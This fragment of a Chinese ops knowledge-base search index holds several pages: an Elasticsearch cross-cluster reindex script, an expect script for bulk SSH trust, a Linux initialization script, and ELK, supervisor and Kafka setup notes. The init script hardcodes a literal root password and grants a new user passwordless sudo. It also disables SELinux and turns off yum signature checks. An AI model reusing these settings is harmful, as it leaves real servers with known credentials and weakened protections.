"},"实用Demo/ES跨集群迁移索引.html":{"url":"实用Demo/ES跨集群迁移索引.html","title":"ES跨集群迁移索引","keywords":"","body":"For Python # coding:utf-8 import sys import json import time,datetime from elasticsearch import Elasticsearch from elasticsearch.helpers import bulk from elasticsearch import helpers import time # example # python es_transfer.py '{\"es_source\":\"192.168.11.75:9200\",\"es_target\":\"192.168.11.9:9920\",\"source_index\":\"new_articles\",\"target_index\":\"new_articles\"}' start_time = time.time() data = sys.argv[1] data = json.loads(data) source_str = data['es_source'] target_str = data['es_target'] source_index = data['source_index'] target_index = data['target_index'] # auth username = 'elastic' password = '' es_source = Elasticsearch(source_str,timeout=500) es_target = Elasticsearch(target_str,http_auth=f\"{username}:{password}\", timeout=500) print('from ' + source_str + '\\\\' + source_index + ' to ' + target_str + '\\\\' + target_index) #build index mapping = es_source.indices.get_mapping(index=source_index) mapping = mapping[source_index]['mappings']['_doc'] try: # ----导入对应index的mapping（不需要可以注释）---- es_target.indices.create(index=target_index) es_target.indices.put_mapping(index=target_index,doc_type='_doc',body=mapping) #es_target.indices.put_mapping(index=target_index,doc_type=source_index,body=mapping) print(\"put mapping finish.\") # ----end---- body = {\"query\":{\"match_all\":{}}} #body = {\"size\":10000,\"query\":{\"terms\":{\"record_uid\":[\"1165829\"]}}} #body = {\"query\":{\"match_all\":{}},\"sort\":[{\"tkPaidTime\":{\"order\":\"desc\"}}]} #body = {\"query\":{\"bool\":{\"filter\":[{\"term\":{\"subsidyType\":\"饿了么\"}},{\"term\":{\"type\":1}}]}}} print(body) data = helpers.reindex(client=es_source,source_index=source_index,target_index=target_index,target_client=es_target,query=body,chunk_size=5000, scroll='15m') print('import finish') print(time.time() - start_time) except Exception as e: print(e) #if str(e) == \"RequestError(400, 'index_already_exists_exception', 'already exists')\": # print(\"index already exists\") # body={\"query\":{\"match_all\":{}}} # helpers.reindex(client=es_source,source_index=source_index,target_index=target_index,target_client=es_target,query=body,chunk_size=5000, scroll='15m') # print('import finish') Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"实用Demo/expect批量建立ssh互信.html":{"url":"实用Demo/expect批量建立ssh互信.html","title":"expect批量建立ssh互信","keywords":"","body":"for shell #!/bin/bash #Author: yongxiaodong #Created with May 17,2017 rpm -qa | grep -q expect if [ $? -ne 0 ];then rpm -ivh tcl-8.5.7-6.el6.x86_64.rpm rpm -ihv expect-5.44.1.15-5.el6_4.x86_64.rpm yum install expect -y fi rpm -qa | grep -q expect if [ $? -ne 0 ];then echo \"please install expect\" exit fi if [ ! -f \"/root/.ssh/id_rsa.pub\" ]; then expect -c \" spawn ssh-keygen expect { \\\"*?id_rsa* \\\" {set timeout 300; send \\\"\\r\\\";exp_continue} \\\"*?passphrase*\\\" {set timeout 300; send \\\"\\r\\\";exp_continue} \\\"*?passphrase*\\\" {set timeout 300; send \\\"\\r\\\";} } expect eof\" fi cat hostsname.txt | while read ipaddr passwd do expect -c \" spawn ssh-copy-id -i /root/.ssh/id_rsa.pub $ipaddr expect { \\\"*?yes/no* \\\" {set timeout 300; send \\\"yes\\r\\\";exp_continue} \\\"*?password:\\\" {set timeout 300; send \\\"$passwd\\r\\\";} } expect eof\" done Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"实用Demo/Linux新系统初始化.html":{"url":"实用Demo/Linux新系统初始化.html","title":"Linux新系统初始化","keywords":"","body":"for shell #!/bin/bash #2017/1/17 #stop service for offser in ip6tables iptables Bluetooth postfix cups cpuspeed NetworkManager vsftpd dhcpd nfs nfslock ypbind rpcbind portreserve xinted do service $offser stop &> /dev/null if [ $? -eq 0 ];then echo \"stop $offser success\" else echo \"stop $offser false\" fi done #set ntp address grep ^server /etc/ntp.conf | head -1 | xargs -i sed -i \"/^{}.*$/i server 10.109.192.35 iburst\" /etc/ntp.conf && echo 'add iburst ntp address success' grep ^server /etc/ntp.conf | head -1 | xargs -i sed -i \"/^{}.*$/i server 10.109.192.12 prefer\" /etc/ntp.conf && echo 'add prefer ntp address success' #set selinux sed -i 's/^SELINUX=.*/SELINUX=disabled/g' /etc/selinux/config && echo 'stop selinux success' #set vlan yum mkdir /etc/yum.repos.d/bak mv /etc/yum.repos.d/* /etc/yum.repos.d/bak/ echo -e \"[a]\\nname=b\\nbaseurl=ftp://10.176.24.118/pub/redhat6.8/\\nenabled=1\\ngpgcheck=0\" > /etc/yum.repos.d/vlan.repo && echo 'add yum success' #lock user for offuser in deamon bin sys adm uucp nuucp printq guest nobody lpd sshd do usermod -L $offuser 2> /dev/null if [ $? -eq 0 ];then echo \"usermod -L $offuser success\" else echo \"usermod -L $offuser false\" fi done #disabled service for offservice in finger telnet sendmail time echo discard daytime chargen comsat klogin kshell ntalk talk tftp uucp dtspc smb ip6tables cups portreserve rpcbind postfix NetworkManager bluetooth vsftpd dhcpd nfslock rpcbind portreserve xinted do chkconfig --level 123456 $offservice off 2> /dev/null if [ $? -eq 0 ];then echo \"chkconfig --level 123456 $offservice off success\" else echo \"chkconfig --level 123456 $offservice off false\" fi done #start service for onservice in sshd ntpd ntpdate cman clvmd rgmanager ricci luci do chkconfig --level 123456 $onservice on 2> /dev/null if [ $? -eq 0 ];then echo \"chkconfig --level 123456 $onservice on success\" else echo \"chkconfig --level 123456 $onservice on false\" fi done #delete suid sgid for desuid in /usr/bin/chage /usr/bin/gpasswd /usr/bin/wall /usr/bin/chfn /usr/bin/chsh /usr/bin/newgrp /usr/bin/write /usr/sbin/usernetctl /bin/mount /bin/umount /sbin/netreport do chmod a-s $desuid 2> /dev/null if [ $? -eq 0 ];then echo \"chmod a-s $desuid success\" else echo \"chmod a-s $deduis false\" fi done #no modification #for chafile in /etc/passwd /etc/shadow /etc/group /etc/gshadow # do # chattr +i $chafile 2> /dev/null # if [ $? -eq 0 ];then # echo \"chattr $chafile success\" # else # echo \"chattr $chafile false\" # fi # done #lock file for lockfile in /etc/audit/auditd.conf /var/log/audit/audit.log /var/log/messages /var/log/cron /var/log/secure /etc/syslog.conf do chmod 640 $lockfile 2> /dev/null if [ $? -eq 0 ];then echo \"chmod 640 $lockfile success\" else echo \"chmod 640 $lockfile false\" fi done for locklog in /var/log/spooler /var/log/mail /var/log/boot.log /var/log/localmessages do chmod 774 $locklog 2> /dev/null if [$? -eq 0 ];then echo \"chmod 774 $locklog success\" else echo \"chmod 774 $locklog false\" fi done mkdir /var/adm echo '''*.err,kern,debug,daemon,notice,mail,crit /var/adm/messages''' >> /etc/rsyslog.conf #su mv /etc/pam.d/su /etc/pam.d/su.bak echo \"auth sufficient pam_rootok.so\">>/etc/pam.d/su echo \"auth required pam_wheel.so group=wheel\">>/etc/pam.d/su cat /etc/pam.d/su.bak >>/etc/pam.d/su chmod 644 /etc/pam.d/su chmod 644 /etc/pam.d/su.bak #set ctrl+alt_del cp -v /etc/init/control-alt-delete.conf /etc/init/control-alt-delete.override sed -i '/^start/'d /etc/init/control-alt-delete.conf && echo \"delete control-alt-delete\" sed -i '/^exec.*$/d' /etc/init/control-alt-delete.conf echo 'exec /usr/bin/logger -p authpriv.notice -t init \"Ctrl-Alt-Del was pressed and ignored\"' >> /etc/init/control-alt-delete.conf && echo \"modify control-alt-delete\" #banner infomation echo 'Banner /etc/issur.net' >> /etc/ssh/sshd_config && echo 'set Banner info' sed -i '1'd /etc/issue.net && echo 'delte issue.conf info' sed -i '/^.*$/i Warning: ATTENTION:Youhaveloggedontoasecuredserver!/' /etc/issue.net && echo 'add issue.conf info' #password security policy sed -i 's/^.*PASS_MAX_DAYS.*[0-9]$/PASS_MAX_DAYS 90/g' /etc/login.defs && echo 'modify pass_max_day 90' sed -i 's/^.*PASS_MIN_DAYS.*[0-9]$/PASS_MIN_DAYS 0/g' /etc/login.defs && echo 'modify pass_min day 0' sed -i 's/^.*PASS_MIN_LEN.*[0-9]$/PASS_MIN_LEN 12/g' /etc/login.defs && echo 'modify pass_min_len 12' sed -i 's/^.*PASS_WARN_AGE.*[0-9]$/PASS_WARN_AGE 7/g' /etc/login.defs && echo 'modify pass_warn_age 7' sed -i '/^password.*type=$/i Password requisite pam_cracklib.so ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 try_first_pass retry=3 type=' /etc/pam.d/system-auth && echo 'password strength policy' sed -i '/^#%PAM.*$/a auth required pam_tally2.so deny=5 unlock_time=300' /etc/pam.d/system-auth && echo \"local login lock user policy\" sed -i '/^#%PAM.*$/a auth required pam_tally2.so even_deny_root deny=5 unlock_time=300' /etc/pam.d/sshd && echo \"ssh login lock user policy\" #time out echo 'export TMOUT=600' >> /etc/profile && echo 'timtou policy' #modify ssh port sed -i 's/^#Port.*22$/Port 10022/g' /etc/ssh/sshd_config sed -i 's/#UseDNS yes/UseDNS no/g' /etc/ssh/sshd_config service sshd reload service ntpd start &> /dev/null #chage -M 91 root #SP1 set echo \"IP=\\`ifconfig | grep 'inet addr:' | awk '{print \\$2}' | awk -F':' '{print \\$2}' | sed -e '/^10.*$/'p -ne '/^22.*$/'p -e '/^20.*/'p | head -n1\\`\" >> /etc/bashrc sed -i '/^.*\\[.*\\=.*\\&\\&.*$/'d /etc/bashrc echo '[ \"$PS1\" = \"\\\\s-\\\\v\\\\\\$ \" ] && PS1=\"[\\u@\\h:$IP:\\w]\\\\$ \"' >> /etc/bashrc #su set useradd weblogic echo 'Ptyw1q2w3e$R' | passwd --stdin weblogic sed -i '/^.*root.*ALL=(ALL).*ALL$/a weblogic ALL=NOPASSWD:ALL,!/bin/su' /etc/sudoers echo 'Ptyw1q2w3e$R' | passwd --stdin root setenforce 0 echo 'ulimit -n 65535' >> /etc/profile Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"实用Demo/MakefileDoc.html":{"url":"实用Demo/MakefileDoc.html","title":"Makefile Doc","keywords":"","body":"# 申明一个build命令,phony申明build是个命令，而不是找当前目录下的文件 .PHONY buildbuild: go build -o aaa main.go 申明一个test命令，并判断testfile是否存在 test: testfile test.... 如果灭有申明version，则赋值 ifndef version version = 2.0 endif Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-07 03:55:23 "},"应用类基操/":{"url":"应用类基操/","title":"应用类基操","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/ELK/":{"url":"应用类基操/ELK/","title":"ELK","keywords":"","body":"ELK 7.7.1 ElasticSearch 单节点部署 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/ELK/1.安装ElasticSearch7.7.1单节点.html":{"url":"应用类基操/ELK/1.安装ElasticSearch7.7.1单节点.html","title":"1.安装ElasticSearch7.7.1单节点","keywords":"","body":"准备工作 1、创建一个用于启动Elasticsearch的用户（elasticSearch不能使用root启动） # 新增用户 useradd elastic 2、安装jdk # 下载 wget https://download.oracle.com/otn/java/jdk/8u202-b08/1961070e4c9b4e26a04e7f5a083f551e/jdk-8u202-linux-x64.tar.gz?AuthParam=1591339121_67708d355c97bec3d5b8fb0e8ec7ff33 # 解压 tar xf jdk-8u202-linux-x64.tar.gz -C /usr/local/ && mv /usr/local/jdk-8u202-linux-x64 /usr/local/jdk # 写入环境变量 cat> /etc/profile export JAVA_HOME=/usr/local/jdk export JRE_HOME=/usr/local/jdk export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH export CLASSPATH=$CLASS_PATH::$JAVA_HOME/lib:$JAVA_HOME/jre/lib EOF # 使环境变量生效 source /etc/profile # 验证 java -version ElasticSearch 安装 1、安装elasticsearch和配置 # 创建ELK 的安装目录 mkdir /usr/local/elk # 下载 ElasticSearch 7.7.1 wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.7.1-linux-x86_64.tar.gz # 解压 tar xf elasticsearch-7.7.1-linux-x86_64.tar.gz -C /usr/local/elk/ mv /usr/local/elk/elasticsearch-7.7.1-linux-x86_64 mv /usr/local/elk/elasticsearch-7.7.1 # 修改elasticsearch配置文件 [root@manager-1 config]# cat elasticsearch.yml | grep -v \"^#\" node.name: node-1 path.data: /data/es-data path.logs: /data/logs/es bootstrap.memory_lock: true network.host: 172.16.2.155 # 本机的IP http.port: 9200 discovery.seed_hosts: [\"172.16.2.155\"] cluster.initial_master_nodes: [\"172.16.2.155\"] 2、 为ES准备系统配置 # 创建elastic存储数据的目录 mkdir -p /data/es-data mkdir -p /data/logs/es # ES要要求vm.max_map_count的值至少为262144 echo vm.max_map_count= 262144 >> /etc/sysctl.conf sysctl -p # 配置文件打开数 cat > /etc/security/limits.conf * soft nofile 65535 * hard nofile 65535 * soft memlock unlimited * hard memlock unlimited EOF 3、 后台启动 /usr/local/elk/elasticsearch-7.7.1/bin/elasticsearch -d 日志路径在/data/logs/es/elasticsearch.log 4、 访问9200端口测试是否正常 [root@manager-1 config]# curl 172.16.2.155:9200 { \"name\" : \"node-1\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"0EvqtzYsSYaSCkhnWYzVGg\", \"version\" : { \"number\" : \"7.7.1\", \"build_flavor\" : \"default\", \"build_type\" : \"tar\", \"build_hash\" : \"ad56dce891c901a492bb1ee393f12dfff473a423\", \"build_date\" : \"2020-05-28T16:30:01.040088Z\", \"build_snapshot\" : false, \"lucene_version\" : \"8.5.1\", \"minimum_wire_compatibility_version\" : \"6.8.0\", \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" }, \"tagline\" : \"You Know, for Search\" } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/ELK/安装filbeat.html":{"url":"应用类基操/ELK/安装filbeat.html","title":"安装filbeat","keywords":"","body":"准备工作 # 创建filebeat安装目录 mkdir -p /usr/local/elk && cd 安装filbeat 1、下载filebeat wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.7.1-linux-x86_64.tar.gz tar xf filebeat-7.7.1-linux-x86_64.tar.gz -C /usr/loca/elk/ && mv /usr/local/elk/filebeat-7.7.1-linux-x86_64 /usr/local/elk/filebeat-7.7.1 2、 配置filebeat filebeat.inputs: - type: log enabled: true # 修改为true表示启用 paths: - /usr/local/server/kuaiban-app-*/logs/app1/*.log # 配置需要被收集的日志路径 - /var/log/*.log output.elasticsearch: hosts: [\"172.16.2.155:9200\"] # 配置elasticsearch 的地址 3、 前台启动filebeat（这里暂时前台启动看看是否正常，也可以配合nohup放入后台运行。文章后面会写通过supervisor管理进程） /usr/local/elk/filebeat-7.7.1/filebeat -e -c /usr/local/elk/filebeat-7.7.1/filebeat.yml 附加了解内容：filebeat进阶配置 1、java多行日志收集 例： multiline: pattern: '^\\s*(\\d{4}|\\d{2})\\-(\\d{2}|[a-zA-Z]{3})\\-(\\d{2}|\\d{4})' # 指定匹配的表达式 negate: true # 是否匹配到 match: after # 合并到上一行的末尾 max_lines: 1000 # 最大的行数 timeout: 10s # 如果在规定的时候没有新的日志事件就不等待后面的日志 fields: # 添加type字段 type: \"stdout\" 2、 自定义索引名（默认filebeat发送的数据会通过filebeat-*索引） output.elasticsearch: # Array of hosts to connect to. hosts: [\"172.16.2.155:9200\"] index: \"30test-environment-%{+yyyy.MM.dd}\" # 设置索引名，按天 setup.ilm.enabled: false # 必须加 setup.template.name: \"30test-environment\" setup.template.pattern: \"30test-environment-*\" 3、 解析json processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ - add_kubernetes_metadata: ~ - decode_json_fields: # 解析json的配置，解析message子弹 fields: [\"message\"] process_array: false max_depth: 3 target: \"\" overwrite_keys: false add_error_key: true - rename: # json字段重命名 fields: - from: \"url\" to: \"request_url\" ignore_missing: false fail_on_error: true 4、 日志输出到logstash output.logstash: hosts: [\"172.16.2.155:5044\"] Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/ELK/安装Kibana.html":{"url":"应用类基操/ELK/安装Kibana.html","title":"安装Kibana","keywords":"","body":"准备工作 1、创建安装目录 mkdir -p /usr/local/elk 安装kibana 1、下载并解压 wget https://artifacts.elastic.co/downloads/kibana/kibana-7.7.1-linux-x86_64.tar.gz tar xf kibana-7.7.1-linux-x86_64.tar.gz -C /usr/local/elk/ mv /usr/local/elk/kibana-7.7.1-linux-x86_64 /usr/local/elk/kibana-7.7.1 2、 配置kibana # cat /usr/local/elk/kibana-7.7.1-linux/config/kibana.yml | grep -v \"^#\" server.port: 5601 server.host: \"0.0.0.0\" # 本地的IP地址0.0.0.0监听所有本地地址 elasticsearch.hosts: [\"http://172.16.2.155:9200\"] # elasticsearch的地址和端口 3、 使用elastic用户启动kibana /usr/local/elk/kibana-7.7.1//bin/kibana 4、 浏览器登陆kibana web页面配置索引 浏览器打开http://172.16.2.155:5601/app/kibana IP替换为kibana服务器的IP 点击index patterns ---- Create index pattern --- 输入filebeat-* 匹配到filebeat发送到es的日志----next step ---- 完成 discover查看收集到的日志数据 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/ELK/附加Logstash安装.html":{"url":"应用类基操/ELK/附加Logstash安装.html","title":"附加Logstash安装","keywords":"","body":"准备 1、安装目录准备 mkdir -p /usr/local/elk Logstash安装配置 1、下载解压Logstash wget https://artifacts.elastic.co/downloads/logstash/logstash-7.7.1.tar.gz tar xf logstash-7.7.1.tar.gz -C /usr/local/elk/ 2、 定义Logstash 配置文件 grok debug 网站：https://grokdebug.herokuapp.com/ > 一个示例： cat config/test.yml input { # 从5044端口接收数据 beats { port => 5044 } } filter { # 按照正则提取日志 grok { match => [ \"message\", \"%{TIMESTAMP_ISO8601:time}\\s*%{LOGLEVEL:loglevel}\\s*---\\s*(?.*?)\\s*:\\s*(?.*)\" ] } # 替换掉json数据前后的\"号 mutate { gsub => [ \"datainfo\", \"\\\"{\", \"{\", \"datainfo\", \"}\\\"\", \"}\" ] # 字段重命名 rename => [ \"host\", \"server\", \"method\", \"java_method\" ] # 移除字段 remove_field => [\"message\"] } # 解析json，并将解析的所有json放到 datainfo_group下 json { source => \"datainfo\" target => \"datainfo_group\" } } # 输出到elasticsearch output { elasticsearch { hosts => [\"172.16.2.155:9200\"] index => \"logstash-%{+YYYY.MM.dd}\" } } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/ELK/附加supervisor进程管理.html":{"url":"应用类基操/ELK/附加supervisor进程管理.html","title":"附加supervisor进程管理","keywords":"","body":"简介： 普通进程管理方案：比如filbeat 默认没有提供后台运行的选项，需要通过nohup或screen等方式放入后台，但是有些缺陷，比如日志管理，还需要单独通过logrotate或脚本单独去清理归档日志，进程自动重启等功能需要单独实现 Supervisor方案：Supervisor是用Python开发的一套通用的进程管理程序，能将一个普通的命令行进程变为后台daemon，并监控进程状态，异常退出时能自动重启，还提供了日志自动归档清理等功能。能更直观、方便的管理进程 安装并新增启动进程的用户 pip install supervisor # 创建用于存放日志和配置文件的目录 useradd elastic mkdir -p /etc/supervisord.d mkdir -p /var/log/supervisor 写入supervisord.conf 配置文件（文件为我自己总结的，根据需要修改） cat /etc/supervisord.conf [unix_http_server] file=/var/log/supervisor/supervisor.sock ; the path to the socket file ;chmod=0700 ; socket file mode (default 0700) ;chown=nobody:nogroup ; socket file uid:gid owner ;username=user ; default is no username (open server) ;password=123 ; default is no password (open server) ;[inet_http_server] ; inet (TCP) server disabled by default ;port=127.0.0.1:9001 ; ip_address:port specifier, *:port for all iface ;username=user ; default is no username (open server) ;password=123 ; default is no password (open server) [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisord] logfile=/var/log/supervisor/supervisord.log ; main log file; default $CWD/supervisord.log logfile_maxbytes=50MB ; max main logfile bytes b4 rotation; default 50MB logfile_backups=10 ; # of main logfile backups; 0 means none, default 10 loglevel=info ; log level; default info; others: debug,warn,trace pidfile=/var/log/supervisor/supervisord.pid ; supervisord pidfile; default supervisord.pid nodaemon=false ; start in foreground if true; default false silent=false ; no logs to stdout if true; default false minfds=65535 ; min. avail startup file descriptors; default 1024 minprocs=65535 ; min. avail process descriptors;default 200 ;umask=022 ; process file creation umask; default 022 ;user=supervisord ; setuid to this UNIX account at startup; recommended if root ;identifier=supervisor ; supervisord identifier, default is 'supervisor' ;directory=/tmp ; default is not to cd during start ;nocleanup=true ; don't clean up tempfiles at start; default false ;childlogdir=/tmp ; 'AUTO' child log dir, default $TEMP ;environment=KEY=\"value\" ; key value pairs to add to environment ;strip_ansi=false ; strip ansi escape codes in logs; def. false [supervisorctl] serverurl=unix:///var/log/supervisor/supervisor.sock ; use a unix:// URL for a unix socket ;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket ;username=chris ; should be same as in [*_http_server] if set ;password=123 ; should be same as in [*_http_server] if set ;prompt=mysupervisor ; cmd line prompt (default \"supervisor\") ;history_file=~/.sc_history ; use readline history if available ;[program:theprogramname] ;command=/bin/cat ; the program (relative uses PATH, can take args) ;process_name=%(program_name)s ; process_name expr (default %(program_name)s) ;numprocs=1 ; number of processes copies to start (def 1) ;directory=/tmp ; directory to cwd to before exec (def no cwd) ;umask=022 ; umask for process (default None) ;priority=999 ; the relative start priority (default 999) ;autostart=true ; start at supervisord start (default: true) ;startsecs=1 ; # of secs prog must stay up to be running (def. 1) ;startretries=3 ; max # of serial start failures when starting (default 3) ;autorestart=unexpected ; when to restart if exited after running (def: unexpected) ;exitcodes=0 ; 'expected' exit codes used with autorestart (default 0) ;stopsignal=QUIT ; signal used to kill process (default TERM) ;stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10) ;stopasgroup=false ; send stop signal to the UNIX process group (default false) ;killasgroup=false ; SIGKILL the UNIX process group (def false) ;user=chrism ; setuid to this UNIX account to run the program ;redirect_stderr=true ; redirect proc stderr to stdout (default false) ;stdout_logfile=/a/path ; stdout log path, NONE for none; default AUTO ;stdout_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stdout_logfile_backups=10 ; # of stdout logfile backups (0 means none, default 10) ;stdout_capture_maxbytes=1MB ; number of bytes in 'capturemode' (default 0) ;stdout_events_enabled=false ; emit events on stdout writes (default false) ;stdout_syslog=false ; send stdout to syslog with process name (default false) ;stderr_logfile=/a/path ; stderr log path, NONE for none; default AUTO ;stderr_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stderr_logfile_backups=10 ; # of stderr logfile backups (0 means none, default 10) ;stderr_capture_maxbytes=1MB ; number of bytes in 'capturemode' (default 0) ;stderr_events_enabled=false ; emit events on stderr writes (default false) ;stderr_syslog=false ; send stderr to syslog with process name (default false) ;environment=A=\"1\",B=\"2\" ; process environment additions (def no adds) ;serverurl=AUTO ; override serverurl computation (childutils) ; The sample eventlistener section below shows all possible eventlistener ; subsection values. Create one or more 'real' eventlistener: sections to be ; able to handle event notifications sent by supervisord. ;[eventlistener:theeventlistenername] ;command=/bin/eventlistener ; the program (relative uses PATH, can take args) ;process_name=%(program_name)s ; process_name expr (default %(program_name)s) ;numprocs=1 ; number of processes copies to start (def 1) ;events=EVENT ; event notif. types to subscribe to (req'd) ;buffer_size=10 ; event buffer queue size (default 10) ;directory=/tmp ; directory to cwd to before exec (def no cwd) ;umask=022 ; umask for process (default None) ;priority=-1 ; the relative start priority (default -1) ;autostart=true ; start at supervisord start (default: true) ;startsecs=1 ; # of secs prog must stay up to be running (def. 1) ;startretries=3 ; max # of serial start failures when starting (default 3) ;autorestart=unexpected ; autorestart if exited after running (def: unexpected) ;exitcodes=0 ; 'expected' exit codes used with autorestart (default 0) ;stopsignal=QUIT ; signal used to kill process (default TERM) ;stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10) ;stopasgroup=false ; send stop signal to the UNIX process group (default false) ;killasgroup=false ; SIGKILL the UNIX process group (def false) ;user=chrism ; setuid to this UNIX account to run the program ;redirect_stderr=false ; redirect_stderr=true is not allowed for eventlisteners ;stdout_logfile=/a/path ; stdout log path, NONE for none; default AUTO ;stdout_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stdout_logfile_backups=10 ; # of stdout logfile backups (0 means none, default 10) ;stdout_events_enabled=false ; emit events on stdout writes (default false) ;stdout_syslog=false ; send stdout to syslog with process name (default false) ;stderr_logfile=/a/path ; stderr log path, NONE for none; default AUTO ;stderr_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB) ;stderr_logfile_backups=10 ; # of stderr logfile backups (0 means none, default 10) ;stderr_events_enabled=false ; emit events on stderr writes (default false) ;stderr_syslog=false ; send stderr to syslog with process name (default false) ;environment=A=\"1\",B=\"2\" ; process environment additions ;serverurl=AUTO ; override serverurl computation (childutils) ; The sample group section below shows all possible group values. Create one ; or more 'real' group: sections to create \"heterogeneous\" process groups. ;[group:thegroupname] ;programs=progname1,progname2 ; each refers to 'x' in [program:x] definitions ;priority=999 ; the relative start priority (default 999) ; The [include] section can just contain the \"files\" setting. This ; setting can list multiple files (separated by whitespace or ; newlines). It can also contain wildcards. The filenames are ; interpreted as relative to this file. Included files *cannot* ; include files themselves. [include] files = supervisord.d/*.conf EOF ElasticSearch 进程管理 cat /etc/supervisord.d/elasticsearch.conf [program:elasticsearch] directory = /usr/local/elk/elasticsearch-7.7.1/bin ; 程序的启动目录 command = /bin/bash elasticsearch ; 启动命令，与命令行启动的命令是一样的 autostart = true ; 在 supervisord 启动的时候也自动启动 startsecs = 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了 autorestart = true ; 程序异常退出后自动重启 startretries = 3 ; 启动失败自动重试次数，默认是 3 user = elastic ; 用哪个用户启动 redirect_stderr = true ; 把 stderr 重定向到 stdout，默认 false stdout_logfile_maxbytes = 20MB ; stdout 日志文件大小，默认 50MB stdout_logfile_backups = 10 ; stdout 日志文件备份数 ; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件） stdout_logfile = /var/log/elasticsearch.log ;日志统一放在log目录下 EOF kibana 进程管理 cat /etc/supervisord.d/kibana.conf [program:kibana] directory = /usr/local/elk/kibana-7.7.1/bin ; 程序的启动目录 command = sh kibana ; 启动命令，与命令行启动的命令是一样的 autostart = true ; 在 supervisord 启动的时候也自动启动 startsecs = 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了 autorestart = true ; 程序异常退出后自动重启 startretries = 3 ; 启动失败自动重试次数，默认是 3 user = elastic ; 用哪个用户启动 redirect_stderr = true ; 把 stderr 重定向到 stdout，默认 false stdout_logfile_maxbytes = 20MB ; stdout 日志文件大小，默认 50MB stdout_logfile_backups = 10 ; stdout 日志文件备份数 ; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件） stdout_logfile = /var/log/kibana.log ;日志统一放在log目录下 EOF Filbeat 进程管理 cat /etc/supervisord.d/filebeat.conf [program:filebeat] directory = /usr/local/elk/filebeat-7.7.1 ; 程序的启动目录 command = /usr/local/elk/filebeat-7.7.1/filebeat -e ; 启动命令，与命令行启动的命令是一样的 autostart = true ; 在 supervisord 启动的时候也自动启动 startsecs = 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了 autorestart = true ; 程序异常退出后自动重启 startretries = 3 ; 启动失败自动重试次数，默认是 3 user = root ; 用哪个用户启动 redirect_stderr = true ; 把 stderr 重定向到 stdout，默认 false stdout_logfile_maxbytes = 20MB ; stdout 日志文件大小，默认 50MB stdout_logfile_backups = 10 ; stdout 日志文件备份数 ; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件） stdout_logfile = /var/log/filebeat.log ;日志统一放在log目录下 EOF 启动等常用操作 启动 supervisord -c /etc/supervisord.conf 修改了配置文件重载 supervisorctl update supervisorctl stop programxxx，停止某一个进程(programxxx)，programxxx 为 [program:beepkg] 里配置的值，这个示例就是 beepkg。 supervisorctl start programxxx，启动某个进程。 supervisorctl restart programxxx，重启某个进程。 supervisorctl status，查看进程状态。 supervisorctl stop groupworker ，重启所有属于名为 groupworker 这个分组的进程(start,restart 同理)。 supervisorctl stop all，停止全部进程，注：start、restart、stop 都不会载入最新的配置文件。 supervisorctl reload，载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程。 supervisorctl update，根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启。 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/Kafka/":{"url":"应用类基操/Kafka/","title":"Kafka","keywords":"","body":"1 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/Kafka/基础操作.html":{"url":"应用类基操/Kafka/基础操作.html","title":"基础操作","keywords":"","body":"基础操作 > 创建Topic ./kafka-topics.sh --zookeeper localhost:2181 --create --topic lfwer --partitions 10 --replication-factor 1 > 查询所有Topic ./kafka-topics.sh --zookeeper localhost:2181 --list > 生产和消费消息 ./kafka-console-producer.sh --topic lfwer --broker-list 192.168.14.81:9092 ./kafka-console-consumer.sh --topic lfwer --bootstrap-server 192.168.14.81:2181 > 查看指定group的消费状态 ./kafka-consumer-groups.sh --bootstrap-server 192.168.14.81:9092 --describe --group lfwer Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"应用类基操/KVM/":{"url":"应用类基操/KVM/","title":"KVM","keywords":"","body":" Copyright © 运维知识库 all right reserved. 